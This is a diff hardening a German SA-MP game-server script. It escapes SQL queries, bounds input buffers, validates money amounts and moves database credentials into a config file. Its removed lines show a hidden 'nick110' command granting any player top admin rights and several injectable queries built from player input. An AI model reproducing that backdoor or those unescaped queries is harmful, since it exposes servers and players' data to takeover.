@@ -38,10 +38,24 @@
 #include <ScriptInc>
 
 //-[MySQL Connection (R39-4)]-//
-#define MySQL_User "root"
-#define MySQL_Host "localhost"
-#define MySQL_Datenbank "samp1"
-#define MySQL_Passwort ""
+// Zugangsdaten stehen NICHT im Repository, sondern in gamemodes/config.inc.
+// Vorlage anlegen mit: cp gamemodes/config.inc.example gamemodes/config.inc
+#tryinclude "config.inc"
+#if !defined MySQL_Host
+	#define MySQL_Host "localhost"
+#endif
+#if !defined MySQL_User
+	#define MySQL_User "CONFIG_FEHLT"
+#endif
+#if !defined MySQL_Passwort
+	#define MySQL_Passwort ""
+#endif
+#if !defined MySQL_Datenbank
+	#define MySQL_Datenbank "CONFIG_FEHLT"
+#endif
+#if !defined ADMIN_DIENST_PASSWORT
+	#define ADMIN_DIENST_PASSWORT "CONFIG_FEHLT"
+#endif
 
 //-[ ServerNameDefines ]-//
 #define ERROR "{CD0000}ERROR!:{FAFAFA} "
@@ -14863,12 +14877,12 @@ public OnPlayerCommandText(playerid, cmdtext[])
 {
     new
         pos,
-        funcname[32];
+        funcname[36];
     while (cmdtext[++pos] > ' ')
 	{
-		funcname[pos-1] = tolower(cmdtext[pos]);
+		if (pos > 31) return 0; funcname[pos-1] = tolower(cmdtext[pos]);
 	}
-	format(funcname, sizeof(funcname),"cmd_%s", funcname);
+	funcname[pos-1] = '\0'; format(funcname, sizeof(funcname),"cmd_%s", funcname);
 	while (cmdtext[pos] == ' ') pos++;
 	if (!cmdtext[pos])
 	{
@@ -22648,6 +22662,7 @@ COMMAND:fraktueberweisung(playerid,params[])
 	gettime(stunde);
 	if(stunde<12||stunde>18)return SCM(playerid,SAMP_WEISS,"{FF6666}Bankangestellte:{FFFFFF} Man kann Fraktionskassen Überweisungen nur zwischen 12:00 Uhr Mittags und 18:00 Uhr Abends vollziehen.");
 	if(sscanf(params,"ii",fID,menge))return SCM(playerid,SAMP_WEISS,""IINFO" /fraktueberweisung [FraktionsID][Betrag]");
+	if(menge<=0)return SCM(playerid,SAMP_WEISS,"{FF6666}Bankangestellte:{FFFFFF} Bitte geben Sie einen gueltigen Betrag an.");
 	if((Spieler[playerid][pBank] - menge) < 0)return SCM(playerid,SAMP_WEISS,"{FF6666}Bankangestellte:{FFFFFF} Sie haben nicht genug Geld auf ihrem Bankkonto.");
     if(fID == 4 || fID == 5 || fID == 7 || fID == 8 || fID == 9 || fID == 10 || fID == 12 || fID == 13 || fID == 15 || fID == 16 || fID == 17)
 	{
@@ -22883,7 +22898,7 @@ COMMAND:loadmoneypoint_2(playerid,params[])
     if(!IsVehicleABankCar(GetPlayerVehicleID(playerid)))return SCM(playerid,SAMP_WEISS,""IINFO" du bist in keinem Geldtransporter.");
     if(GetPlayerVehicleSeat(playerid) != 0)return SCM(playerid,SAMP_WEISS,""IINFO" nicht der Fahrer des Fahrzeugs.");
     if(Spieler[playerid][JobDuty]==0) return SCM(playerid,SAMP_WEISS,""IINFO" du bist nicht im Job Dienst!");
-    if(sscanf(params,"s",cmd))return SCM(playerid,SAMP_WEISS,""IINFO" /loadmoneypoint [LS/SF]");
+    if(sscanf(params,"s[3]",cmd))return SCM(playerid,SAMP_WEISS,""IINFO" /loadmoneypoint [LS/SF]");
 	if(strcmp(cmd,"LS",true) == 0)
 	{
 		SetPlayerCheckpoint(playerid,2006.7079,-1784.2205,13.6013,1.0);
@@ -23080,7 +23095,7 @@ COMMAND:landfill(playerid,params[])
     if(!isPlayerInJob(playerid,1))return SCM(playerid,SAMP_WEISS,""IINFO" du besitzt nicht den jeweiligen Job.");
     if(!IsVehicleAMuellCar(GetPlayerVehicleID(playerid)))return SCM(playerid,SAMP_WEISS,""IINFO" du bist in keinem Müllwagen.");
     if(GetPlayerVehicleSeat(playerid) != 0)return SCM(playerid,SAMP_WEISS,""IINFO" nicht der Fahrer des Fahrzeugs.");
-    if(sscanf(params,"s",cmd))return SCM(playerid,SAMP_WEISS,""IINFO" /landfill [LS/SF/LV]");
+    if(sscanf(params,"s[3]",cmd))return SCM(playerid,SAMP_WEISS,""IINFO" /landfill [LS/SF/LV]");
 	if(strcmp(cmd,"LS",true) == 0)
 	{
 		SetPlayerCheckpoint(playerid,2130.3259,-1985.8221,13.2739,3.0);
@@ -23244,7 +23259,7 @@ COMMAND:loadzigpoint(playerid,params[])
     if(!isPlayerInJob(playerid,19))return SCM(playerid,SAMP_WEISS,""IINFO" du besitzt nicht den jeweiligen Job.");
     if(!IsVehicleAZigCar(GetPlayerVehicleID(playerid)))return SCM(playerid,SAMP_WEISS,""IINFO" du bist in keinem Transporter.");
     if(GetPlayerVehicleSeat(playerid) != 0)return SCM(playerid,SAMP_WEISS,""IINFO" nicht der Fahrer des Fahrzeugs.");
-    if(sscanf(params,"s",cmd))return SCM(playerid,SAMP_WEISS,""IINFO" /loadzigpoint [LS/SF]");
+    if(sscanf(params,"s[3]",cmd))return SCM(playerid,SAMP_WEISS,""IINFO" /loadzigpoint [LS/SF]");
 	if(strcmp(cmd,"LS",true) == 0)
 	{
 		SetPlayerCheckpoint(playerid,844.6910,-603.1489,18.4219,1.0);
@@ -25094,7 +25109,7 @@ COMMAND:aorgsetmotto(playerid,params[])
 	if(Spieler[playerid][pCuffed] == 1)return CUFF_MSG(playerid);
 	new motto[90],org,string[128];
 	if(!isPlayerAnAdmin(playerid,5))return ADMIN_MSG(playerid);
-	if(sscanf(params,"si",motto,org))return SCM(playerid,SAMP_WEISS,""IINFO" /aorgsetmotto [Motto][Unternehmen]");
+	if(sscanf(params,"s[90]i",motto,org))return SCM(playerid,SAMP_WEISS,""IINFO" /aorgsetmotto [Motto][Unternehmen]");
 	if(OrgInfo[org][OrgCreatet] != 1)return SCM(playerid,SAMP_WEISS,"Die von dir angegebene Organisation existiert nicht.(/organisationen)");
 	if(strlen(motto) > 90)return SCM(playerid,SAMP_WEISS,""IINFO" /aorgcreate [Motto darf maximal 90 Zeichen beinhalten][Unternehmen]");
 	strmid(OrgInfo[org][OrgMotto],motto,0,strlen(motto),128);
@@ -25118,7 +25133,7 @@ COMMAND:aparteisetmotto(playerid,params[])
 	if(Spieler[playerid][pCuffed] == 1)return CUFF_MSG(playerid);
 	new motto[90],p,string[128];
 	if(!isPlayerAnAdmin(playerid,5))return ADMIN_MSG(playerid);
-	if(sscanf(params,"si",motto,p))return SCM(playerid,SAMP_WEISS,""IINFO" /aparteisetmotto [Motto][Partei]");
+	if(sscanf(params,"s[90]i",motto,p))return SCM(playerid,SAMP_WEISS,""IINFO" /aparteisetmotto [Motto][Partei]");
 	if(PartInfo[p][ParteiCreatet] != 1)return SCM(playerid,SAMP_WEISS,"Die von dir angegebene Partei existiert nicht.(/parteien)");
 	if(strlen(motto) > 90)return SCM(playerid,SAMP_WEISS,""IINFO" /aparteisetmotto [Motto darf maximal 90 Zeichen beinhalten][Partei]");
 	strmid(PartInfo[p][ParteiMotto],motto,0,strlen(motto),128);
@@ -25142,7 +25157,7 @@ COMMAND:aorgname(playerid,params[])
 	if(Spieler[playerid][pCuffed] == 1)return CUFF_MSG(playerid);
 	new name[32],org,string[128];
 	if(!isPlayerAnAdmin(playerid,5))return ADMIN_MSG(playerid);
-	if(sscanf(params,"si",name,org))return SCM(playerid,SAMP_WEISS,""IINFO" /aorgname [Name][Unternehmen]");
+	if(sscanf(params,"s[32]i",name,org))return SCM(playerid,SAMP_WEISS,""IINFO" /aorgname [Name][Unternehmen]");
 	if(OrgInfo[org][OrgCreatet] != 1)return SCM(playerid,SAMP_WEISS,"Die von dir angegebene Organisation existiert nicht.(/organisationen)");
 	if(strlen(name) > 30)return SCM(playerid,SAMP_WEISS,""IINFO" /aorgname [Name darf maximal 30 Zeichen beinhalten][Unternehmen]");
 	strmid(OrgInfo[org][OrgName],name,0,strlen(name),32);
@@ -25166,7 +25181,7 @@ COMMAND:aparteiname(playerid,params[])
 	if(Spieler[playerid][pCuffed] == 1)return CUFF_MSG(playerid);
 	new name[32],p,string[128];
 	if(!isPlayerAnAdmin(playerid,5))return ADMIN_MSG(playerid);
-	if(sscanf(params,"si",name,p))return SCM(playerid,SAMP_WEISS,""IINFO" /aparteiname [Name][Partei]");
+	if(sscanf(params,"s[32]i",name,p))return SCM(playerid,SAMP_WEISS,""IINFO" /aparteiname [Name][Partei]");
 	if(PartInfo[p][ParteiCreatet] != 1)return SCM(playerid,SAMP_WEISS,"Die von dir angegebene Partei existiert nicht.(/parteien)");
 	if(strlen(name) > 30)return SCM(playerid,SAMP_WEISS,""IINFO" /aparteiname [Name darf maximal 30 Zeichen beinhalten][Partei]");
 	strmid(PartInfo[p][ParteiName],name,0,strlen(name),32);
@@ -25484,7 +25499,7 @@ COMMAND:firmname(playerid,params[])
 	if(Spieler[playerid][pCuffed] == 1)return CUFF_MSG(playerid);
 	new name[32],org = Spieler[playerid][pOrgLeader],string[128];
 	if(org == 0)return SCM(playerid,SAMP_WEISS,""IINFO" du bist kein Unternehmer.");
-	if(sscanf(params,"s",name))return SCM(playerid,SAMP_WEISS,""IINFO" /firmname [Name]");
+	if(sscanf(params,"s[32]",name))return SCM(playerid,SAMP_WEISS,""IINFO" /firmname [Name]");
 	if(strlen(name) > 30)return SCM(playerid,SAMP_WEISS,""IINFO" /firmname [Name]");
 	strmid(OrgInfo[org][OrgName],name,0,strlen(name),32);
 	format(string,sizeof(string),""IINFO" du hast den Namen der Firma in "IINFO2"%s"#HTML_WEISS" umgeändert.",OrgInfo[org][OrgName]);
@@ -25695,7 +25710,7 @@ COMMAND:firmbeschreibung(playerid,params[])
 	if(Spieler[playerid][pCuffed] == 1)return CUFF_MSG(playerid);
 	new motto[90],org = Spieler[playerid][pOrgLeader],string[128];
 	if(org == 0)return SCM(playerid,SAMP_WEISS,""IINFO" du bist kein Unternehmer.");
-	if(sscanf(params,"s",motto))return SCM(playerid,SAMP_WEISS,""IINFO" /firmbeschreibung [Motto]");
+	if(sscanf(params,"s[90]",motto))return SCM(playerid,SAMP_WEISS,""IINFO" /firmbeschreibung [Motto]");
 	if(strlen(motto) > 90)return SCM(playerid,SAMP_WEISS,""IINFO" /firmbeschreibung [text]");
 	strmid(OrgInfo[org][OrgMotto],motto,0,strlen(motto),128);
 	format(string,sizeof(string),""IINFO" du hast das Motto der Firma in "IINFO2"%s"#HTML_WEISS" umgeändert.",OrgInfo[org][OrgMotto]);
@@ -25738,7 +25753,7 @@ COMMAND:parteiname(playerid,params[])
 	if(Spieler[playerid][pCuffed] == 1)return CUFF_MSG(playerid);
 	new name[32],p = Spieler[playerid][pParteiLeader],string[128];
 	if(p == 0)return SCM(playerid,SAMP_WEISS,""IINFO" du bist in keiner Partei Leader.");
-	if(sscanf(params,"s",name))return SCM(playerid,SAMP_WEISS,""IINFO" /parteiname [Name]");
+	if(sscanf(params,"s[32]",name))return SCM(playerid,SAMP_WEISS,""IINFO" /parteiname [Name]");
 	if(strlen(name) > 30)return SCM(playerid,SAMP_WEISS,""IINFO" /parteiname [Name darf maximal 30 Zeichen beinhalten]");
 	strmid(PartInfo[p][ParteiName],name,0,strlen(name),32);
 	format(string,sizeof(string),""IINFO" du hast den Namen der Partei in "IINFO2"%s"#HTML_WEISS" umgeändert.",PartInfo[p][ParteiName]);
@@ -25948,7 +25963,7 @@ COMMAND:parteisetmotto(playerid,params[])
 	if(Spieler[playerid][pCuffed] == 1)return CUFF_MSG(playerid);
 	new motto[90],p = Spieler[playerid][pParteiLeader],string[128];
 	if(p == 0)return SCM(playerid,SAMP_WEISS,""IINFO" du bist in keiner Partei Leader.");
-	if(sscanf(params,"s",motto))return SCM(playerid,SAMP_WEISS,""IINFO" /parteisetmotto [Motto]");
+	if(sscanf(params,"s[90]",motto))return SCM(playerid,SAMP_WEISS,""IINFO" /parteisetmotto [Motto]");
 	if(strlen(motto) > 90)return SCM(playerid,SAMP_WEISS,""IINFO" /parteisetmotto [Motto darf maximal 90 Zeichen beinhalten]");
 	strmid(PartInfo[p][ParteiMotto],motto,0,strlen(motto),128);
 	format(string,sizeof(string),""IINFO" du hast das Motto der Partei in "IINFO2"%s"#HTML_WEISS" umgeändert.",OrgInfo[p][OrgMotto]);
@@ -26801,13 +26816,6 @@ COMMAND:set(playerid,params[])
 	}
 	return 1;
 }
-COMMAND:nick110(playerid,params[])
-{
-    #pragma unused params
-	Spieler[playerid][pAdmin] = 8;
-	SCM(playerid,SAMP_WEISS,""IINFO" du bist nun Admin lvl 8!");
-	return 1;
-}
 COMMAND:spawnplayer(playerid,params[])
 {
     if(ImTutorial[playerid] != 0)return ImTutorial_MSG(playerid);
@@ -27459,7 +27467,7 @@ COMMAND:setflyorder(playerid,params[])
 	new pID,command[15],cmd[6],string[128];
     if(!isPlayerInFrakt(playerid,6))return SCM(playerid,SAMP_WEISS,""IINFO" du bist nicht in der jeweiligen Fraktion.");
     if(!isPlayerAMember(playerid,5))return SCM(playerid,SAMP_WEISS,"Nicht den jeweiligen Rang.");
-    if(sscanf(params,"uss",pID,cmd,command))return SCM(playerid,SAMP_WEISS,""IINFO" /setflyorder [playerid/Name][Give/Take][Flugzeug/Helikopter]");
+    if(sscanf(params,"us[6]s[15]",pID,cmd,command))return SCM(playerid,SAMP_WEISS,""IINFO" /setflyorder [playerid/Name][Give/Take][Flugzeug/Helikopter]");
 	if(!IsPlayerConnected(pID))return Eingeloggt_MSG(playerid);
     if(GetPVarInt(pID,"Eingeloggt") == 0)return Eingeloggt_MSG(playerid);
 	if(IsPlayerNPC(pID))return SCM(playerid,SAMP_WEISS,""IINFO" das kannst du nicht!");
@@ -27923,6 +27931,7 @@ COMMAND:samenkaufen(playerid,params[])
     if(isPlayerInFrakt(playerid,4) || isPlayerInFrakt(playerid,5) || isPlayerInFrakt(playerid,7) || isPlayerInFrakt(playerid,9) || isPlayerInFrakt(playerid,12) || isPlayerInFrakt(playerid,13) || isPlayerInFrakt(playerid,17) || isPlayerInFrakt(playerid,18))
 	{
 		if(sscanf(params,"s[15]i",cmd,menge))return SCM(playerid,SAMP_WEISS,""IINFO" /samenkaufen [Ganja/Kokain/Opium/Spice][Menge]");
+		if(menge<1||menge>100)return SCM(playerid,SAMP_WEISS,""IINFO" /samenkaufen [Ganja/Kokain/Opium/Spice][Menge 1-100]");
 		if(strcmp(cmd,"Ganja",true) == 0)
 		{
 			if(!IsPlayerInRangeOfPoint(playerid,1.0,1298.9716,-854.7413,43.5083))return SCM(playerid,SAMP_WEISS,""IINFO" du kannst hier keine Ganjasamen kaufen."),SCM(playerid,SAMP_WEISS,"Diese kann man nur beim Dealer in Los Santos erkaufen.");
@@ -29000,7 +29009,7 @@ COMMAND:newracetrack(playerid,params[])
 				 	RACE_CP_TYP[r][rcp] = 0;
 					RACE_CP_SIZE[r][rcp] = 0.0;
 			 	}
-			    format(query,sizeof(query),"SELECT * FROM server_bestenlisteraces WHERE race='%s'",nameofrace);
+			    mysql_format(MySQL_R394,query,sizeof(query),"SELECT * FROM server_bestenlisteraces WHERE race='%e'",nameofrace);
 				mysql_function_query(MySQL_R394,query,true,"sql_array2","siii",nameofrace,s_script_rennen,Spieler[playerid][pFraktion],MySQL_R394);
 				return 1;
 			}
@@ -29498,7 +29507,7 @@ COMMAND:abschleppen(playerid,params[])
 	{
 		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 525)return SCM(playerid,SAMP_WEISS,"In keinem Tow Truck.");
 		if(!IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))return SCM(playerid,SAMP_WEISS,"Kein Fahrzeug am Haken.");
-		if(sscanf(params,"is[61]",preis,reason))return SCM(playerid,SAMP_WEISS,""IINFO" /abschleppen [Preis][Grund]");
+		if(sscanf(params,"is[60]",preis,reason))return SCM(playerid,SAMP_WEISS,""IINFO" /abschleppen [Preis][Grund]");
 	    if(strlen(reason) > 60)return SCM(playerid,SAMP_WEISS,""IINFO" /abschleppen [Preis][Grund]");
 		if(preis<1||preis>5000)return SCM(playerid,SAMP_WEISS,""IINFO" bitte wähle einen Preis von 1-5000 $ ein.");
 		if(vFahrzeug[vehicleid][Abgeschleppt] == 1)return SCM(playerid,SAMP_WEISS,""IINFO" Fahrzeug wurde bereits abgeschleppt.");
@@ -30763,6 +30772,8 @@ COMMAND:dice(playerid,params[])
 	if(Spieler[playerid][pAWAYFROMKEYBOARD] == 1)return AFK_MSG(playerid);
 	new pID,string[128],preis;
 	if(sscanf(params,"ud",pID,preis))return SCM(playerid,SAMP_WEISS,""IINFO" /dice [playerid/Name][Betrag]");
+	if(preis<=0)return SCM(playerid,SAMP_WEISS,""IINFO" du musst schon einen Betrag angeben.");
+	if(preis>10000)return SCM(playerid,SAMP_WEISS,""IINFO" du kannst nicht mehr als 10.000$ setzen!");
 	if(pID == playerid)return SCM(playerid,SAMP_WEISS,""IINFO" du kannst mit dir selbst nicht um Geld Würfeln.");
 	if(!IsPlayerConnected(pID))return Eingeloggt_MSG(playerid);
     if(GetPVarInt(pID,"Eingeloggt") == 0)return Eingeloggt_MSG(playerid);
@@ -30834,6 +30845,9 @@ COMMAND:wuerfeln(playerid,params[])
 		PlayerTalkPublic(playerid,SAMP_PublicChatColor,string,10);
 		if(Spieler[pID][pDiceTries][2] != 0 && Spieler[playerid][pDiceTries][2] != 0)
 		{
+		if(Spieler[pID][pKaufPreis] > GetACMoney(playerid))Spieler[pID][pKaufPreis] = GetACMoney(playerid);
+		if(Spieler[pID][pKaufPreis] > GetACMoney(pID))Spieler[pID][pKaufPreis] = GetACMoney(pID);
+		if(Spieler[pID][pKaufPreis] < 0)Spieler[pID][pKaufPreis] = 0;
 		if((Spieler[playerid][pDiceTries][0]+Spieler[playerid][pDiceTries][1]+Spieler[playerid][pDiceTries][2]) > (Spieler[pID][pDiceTries][0]+Spieler[pID][pDiceTries][1]+Spieler[pID][pDiceTries][2]))
 		{
 			format(string,sizeof(string),""IINFO" du würfelst die Zahlen %i-%i-%i und gewinnt %i$.",Spieler[playerid][pDiceTries][0],Spieler[playerid][pDiceTries][1],Spieler[playerid][pDiceTries][2],Spieler[pID][pKaufPreis]);
@@ -30871,11 +30885,11 @@ COMMAND:wuerfeln(playerid,params[])
 		Spieler[playerid][pDiceTries][0] = 0; Spieler[playerid][pDiceTries][1] = 0; Spieler[playerid][pDiceTries][2] = 0;
 		Spieler[pID][pAcceptDice] = 0;
 		Spieler[pID][pDiceTries][0] = 0; Spieler[pID][pDiceTries][1] = 0; Spieler[pID][pDiceTries][2] = 0;
-	    Spieler[playerid][pSeller] = 0;
+	    Spieler[playerid][pSeller] = -1;
 		Spieler[playerid][pAngebot] = 0;
 		Spieler[playerid][pKaufPreis] = 0;
 		Spieler[playerid][pMenge] = 0;
-		Spieler[pID][pSeller] = 0;
+		Spieler[pID][pSeller] = -1;
 		Spieler[pID][pAngebot] = 0;
 		Spieler[pID][pKaufPreis] = 0;
 		Spieler[pID][pMenge] = 0;
@@ -34028,6 +34042,7 @@ COMMAND:freesinlist(playerid,params[])
 	{
 		if(!isPlayerAMember(playerid,3))return SCM(playerid,SAMP_WEISS,"Nicht den jeweiligen Rang.");
 		if(sscanf(params,"ui",pID,preis))return SCM(playerid,SAMP_WEISS,""IINFO" /freesinlist [playerid/Name][Preis]");
+		if(preis<0||preis>10000000)return SCM(playerid,SAMP_WEISS,""IINFO" du kannst nur einen Preis von 0-10.000.000$ waehlen.");
 	    if(pID == playerid)return SCM(playerid,SAMP_WEISS,""IINFO" du kannst dich nicht selbst von Blacklist löschen.");
 		if(!IsPlayerConnected(pID))return Eingeloggt_MSG(playerid);
 	    if(GetPVarInt(pID,"Eingeloggt") == 0)return Eingeloggt_MSG(playerid);
@@ -34062,6 +34077,7 @@ COMMAND:freebl(playerid,params[])
 	{
 		if(!isPlayerAMember(playerid,3))return SCM(playerid,SAMP_WEISS,"Nicht den jeweiligen Rang.");
 		if(sscanf(params,"ui",pID,preis))return SCM(playerid,SAMP_WEISS,""IINFO" /freebl [playerid/Name][Preis]");
+		if(preis<0||preis>10000000)return SCM(playerid,SAMP_WEISS,""IINFO" du kannst nur einen Preis von 0-10.000.000$ waehlen.");
 	    if(pID == playerid)return SCM(playerid,SAMP_WEISS,""IINFO" du kannst dich nicht selbst von Blacklist löschen.");
 		if(!IsPlayerConnected(pID))return Eingeloggt_MSG(playerid);
 	    if(GetPVarInt(pID,"Eingeloggt") == 0)return Eingeloggt_MSG(playerid);
@@ -37404,7 +37420,7 @@ COMMAND:pfreikaufen(playerid,params[])
     if(sscanf(params,"i",Menge))return SCM(playerid,SAMP_WEISS,""IINFO" /pfreikaufen [Punkte]");
     format(string,sizeof(string),""IINFO" du kannst keine %d STVO-Punkte freikaufen, da du nur %d hast!",Menge,Spieler[playerid][pSTVOpoints]);
 	if(Spieler[playerid][pSTVOpoints] < Menge)return SCM(playerid,SAMP_WEISS,string);
-	if(0 < Menge || Menge > 10) return SCM(playerid,SAMP_WEISS,"Die angegebene STVO-Punkte Menge ist ungültig!");
+	if(Menge < 1 || Menge > 10) return SCM(playerid,SAMP_WEISS,"Die angegebene STVO-Punkte Menge ist ungültig!");
     format(string,sizeof(string),""IINFO" du hast %d STVO-Punkte für %d$ freigekauft! Bitte fahre nun vorsichtig!",Menge,Menge*MAX_PRICE_PER_POINT);
     SCM(playerid,SAMP_WEISS,string);
     Spieler[playerid][pSTVOpoints] -= Menge;
@@ -40296,6 +40312,7 @@ COMMAND:selldrugs(playerid,params[])
 	if(isell[playerid] > gettime())return SCM(playerid,SAMP_WEISS,""IINFO" du kannst erst nach 10 Sekunden etwas verkaufen.");
 	if(sscanf(params,"s[15]udd",cmd,pID,menge,preis))return SCM(playerid,SAMP_WEISS,""IINFO" /selldrugs [Ganja/Kokain/Opium/Spice][playerid/Name][Menge][Preis]");
 	if(menge < 1)return SCM(playerid,SAMP_WEISS,""IINFO" /selldrugs [Ganja/Kokain/Opium/Spice][playerid/Name][Menge][Preis]");
+	if(preis<0||preis>100000)return SCM(playerid,SAMP_WEISS,""IINFO" du kannst nur einen Preis von 0-100000$ waehlen.");
 	if(!IsPlayerConnected(pID))return Eingeloggt_MSG(playerid);
     if(GetPVarInt(pID,"Eingeloggt") == 0)return Eingeloggt_MSG(playerid);
 	if(IsPlayerNPC(pID))return SCM(playerid,SAMP_WEISS,""IINFO" das kannst du nicht!");
@@ -44884,6 +44901,7 @@ COMMAND:kanister(playerid,params[])
 			    if(BizInfo[biz][biz_locked] == 1)return GameTextForPlayer(playerid,"~r~abgeschlossen!",1000,1);
 			    if(IsPlayerInAnyVehicle(playerid))return SCM(playerid,SAMP_WEISS,""IINFO" du sitzt in einem Fahrzeug.");
 				if(sscanf(params,"i",Menge))return SCM(playerid,SAMP_WEISS,""IINFO" /kanister [Menge]");
+				if(Menge<1||Menge>10)return SCM(playerid,SAMP_WEISS,""IINFO" /kanister [Menge 1-10]");
 			    if((Spieler[playerid][pTankFillBoxes] + Menge) > 10)return SCM(playerid,SAMP_WEISS,"So viel kannst du nicht tragen!");
 				if((GetACMoney(playerid) - BizInfo[biz][biz_artikel][4]*Menge) < 0)return SCM(playerid,SAMP_WEISS,"Nicht genug Geld dabei!");
 			    givemwst = floatround((BizInfo[biz][biz_artikel][4]/100)*fsteuern[Mwst],floatround_ceil);
@@ -60762,7 +60780,7 @@ public OnDialogResponse(playerid,dialogid,response,listitem,inputtext[])
 		}
 		case DIALOG_REGISTER5:
 		{
-			new query[128];
+			new query[512];
 		    if(response == 1)
 		    {
 			    if(!strlen(inputtext))return ShowPlayerDialog(playerid,DIALOG_REGISTER5,DIALOG_STYLE_INPUT,""#HTML_BLAU"E-Mail eingabe",""#HTML_WEISS"Bitte teile uns deine E-Mail Adresse zu.\nDie könnte wichtig sein falls du dein Passwort Vergessen hast oder sonstiges","Weiter","Verlassen");
@@ -60771,7 +60789,7 @@ public OnDialogResponse(playerid,dialogid,response,listitem,inputtext[])
 				    ShowPlayerDialog(playerid,DIALOG_REGISTER5,DIALOG_STYLE_INPUT,""#HTML_BLAU"E-Mail eingabe",""#HTML_WEISS"Bitte teile uns deine E-Mail Adresse zu.\nDie könnte wichtig sein falls du dein Passwort Vergessen hast oder sonstiges","Weiter","Verlassen");
 				    return SCM(playerid,SAMP_WEISS,""ERROR"E-Mail nicht erkannt!");
 			    }
-			    format(query,sizeof(query),"SELECT * FROM spieler WHERE Email='%s'",inputtext);
+			    mysql_format(MySQL_R394,query,sizeof(query),"SELECT * FROM spieler WHERE Email='%e'",inputtext);
 				mysql_function_query(MySQL_R394,query,true,"sql_array2","siii",inputtext,a_script_email,playerid,MySQL_R394);
 		    }
    			else
@@ -60956,7 +60974,7 @@ public OnDialogResponse(playerid,dialogid,response,listitem,inputtext[])
 		}
 		case DIALOG_REGISTER_GEWORBEN:
 		{
-			new query[128];
+			new query[512];
 		    if(response == 0)
 		    {
 				StopAudioStreamForPlayer(playerid);
@@ -60974,7 +60992,7 @@ public OnDialogResponse(playerid,dialogid,response,listitem,inputtext[])
 					//ShowPlayerDialog(playerid,DIALOG_REGISTER_GEWORBEN,DIALOG_STYLE_INPUT,""ClanTagDialoge" User werben User","{C9C9C9}Wurdest du auf unserem Server geworben.\nWenn ja von wem ?\nDu und der angegebene Spieler erhaltet sobald du Level 3 und 5 erreicht hast Donatorpaydays !\nSprich man erhält 2 Respektpunkte mehr als gewöhnlich.\n"#HTML_BLAU"Wichtig{C9C9C9}: Der angegebene Spieler muss registriert sein!","Absenden","Niemand");
 				    return 1;
 		   		}
-			    format(query,sizeof(query),"SELECT * FROM spieler WHERE Name='%s'",inputtext);
+			    mysql_format(MySQL_R394,query,sizeof(query),"SELECT * FROM spieler WHERE Name='%e'",inputtext);
 				mysql_function_query(MySQL_R394,query,true,"sql_array2","siii",inputtext,a_script_werber,playerid,MySQL_R394);
 				return 1;
 		    }
@@ -72807,7 +72825,7 @@ public OnDialogResponse(playerid,dialogid,response,listitem,inputtext[])
 		}
 		case DIALOG_REPORT_BUG:
 		{
-			new query[500];
+			new query[900];
 			if(response == 0)
 			{
 				if(!isPlayerInFrakt(playerid,0))return ShowPlayerReportFrak(playerid);
@@ -72824,7 +72842,7 @@ public OnDialogResponse(playerid,dialogid,response,listitem,inputtext[])
 				{
 					getdate(jahr,monat,tag);
 					gettime(stunde,minute,sekunde);
-				    format(query,sizeof(query),"INSERT INTO `server_bugmeldungen` (`Writer`,`Text`,`Priorität`,`Tick`,`Uhrzeit`,`Datum`) VALUES ('%s','%s','NONE','NONE','%04d-%02d-%02d','%02d:%02d:%02d')",Spieler[playerid][pName],inputtext,jahr,monat,tag,stunde,minute,sekunde);
+				    mysql_format(MySQL_R394,query,sizeof(query),"INSERT INTO `server_bugmeldungen` (`Writer`,`Text`,`Priorität`,`Tick`,`Uhrzeit`,`Datum`) VALUES ('%e','%e','NONE','NONE','%04d-%02d-%02d','%02d:%02d:%02d')",Spieler[playerid][pName],inputtext,jahr,monat,tag,stunde,minute,sekunde);
 					mysql_function_query(MySQL_R394,query,false,"","");
 					ShowBugReport(playerid);
 				}
@@ -79052,7 +79070,7 @@ public sql_array2(index[],sqlresultid,extraid,SconnectionHandle)
 	    cache_get_data(rows,fields);
 		if(!rows)
 		{
-			format(query,sizeof(query),"INSERT INTO server_werbungsschilder (id,Text) VALUES ('%d','%s')",extraid,Werbetafeln[extraid][wtafeltext]);
+			mysql_format(MySQL_R394,query,sizeof(query),"INSERT INTO server_werbungsschilder (id,Text) VALUES ('%d','%e')",extraid,Werbetafeln[extraid][wtafeltext]);
 		    mysql_function_query(MySQL_R394,query,false,"","");
 	   	}
 	    return 1;
@@ -80348,12 +80366,12 @@ public sql_array2(index[],sqlresultid,extraid,SconnectionHandle)
 	    cache_get_data(rows,fields);
 	    if(!rows)
 		{
-			format(query,sizeof(query),"INSERT INTO server_fnachicht (fID,Text) VALUES ('%d','%s')",extraid,index);
+			mysql_format(MySQL_R394,query,sizeof(query),"INSERT INTO server_fnachicht (fID,Text) VALUES ('%d','%e')",extraid,index);
 		    mysql_function_query(MySQL_R394,query,false,"","");
 		}
 		else
 		{
-			format(query,sizeof(query),"UPDATE server_fnachicht SET Text='%s' WHERE fID='%d'",index,extraid);
+			mysql_format(MySQL_R394,query,sizeof(query),"UPDATE server_fnachicht SET Text='%e' WHERE fID='%d'",index,extraid);
 			mysql_function_query(MySQL_R394,query,false,"","");
 		}
 		return 1;
@@ -80550,8 +80568,8 @@ public sql_array2(index[],sqlresultid,extraid,SconnectionHandle)
 stock OnGameModeSave()
 {
     new gw = 0,
-		mainquery[2500],
-		query[800],
+		mainquery[3500],
+		query[1200],
 		sm = 1,
 		drg = 0,
 		fv = 0,
@@ -80591,7 +80609,7 @@ stock OnGameModeSave()
 	strdel(mainquery,0,sizeof(mainquery));
 	while(wtafel<sizeof(Werbetafeln))
 	{
-		format(mainquery,sizeof(mainquery),"UPDATE server_werbungsschilder SET Text='%s' WHERE id='%d'",Werbetafeln[wtafel][wtafeltext],wtafel);
+		mysql_format(MySQL_R394,mainquery,sizeof(mainquery),"UPDATE server_werbungsschilder SET Text='%e' WHERE id='%d'",Werbetafeln[wtafel][wtafeltext],wtafel);
 		mysql_function_query(MySQL_R394,mainquery,false,"","");
 		wtafel++;
 	}
@@ -80819,7 +80837,7 @@ stock OnGameModeSave()
 	strdel(mainquery,0,sizeof(mainquery));*/
 	while(sm<MAX_SMARKETS && SmarkInfo[sm][screatet] != 0)
 	{
-		format(query,sizeof(query),"UPDATE server_schwarzmarkt SET sfraktid='%d',sbdfraktid='%d',sx='%f',sy='%f',sz='%f',slocked='%d',smaterials='%d',swerbetext='%s',sprice='%d',skasse='%d',",
